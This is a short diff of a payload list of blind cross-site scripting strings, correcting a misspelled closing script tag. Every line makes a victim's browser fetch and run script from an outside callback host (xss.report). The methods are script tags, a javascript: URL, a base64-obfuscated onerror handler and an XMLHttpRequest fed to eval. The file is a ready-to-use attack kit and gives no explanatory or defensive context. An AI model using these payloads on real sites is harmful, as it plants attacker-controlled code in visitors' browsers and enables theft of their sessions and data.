@@ -1,5 +1,5 @@
 '"><script src=https://xss.report/c/hnterx?1></script>
-';"</scrpt><script/src=//xss.report/c/hnterx?66></script>
+';"</script><script/src=//xss.report/c/hnterx?66></script>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/hnterx?2\';document.body.appendChild(a)')
 "><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8zIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/hnterx?4");a.send();</script>
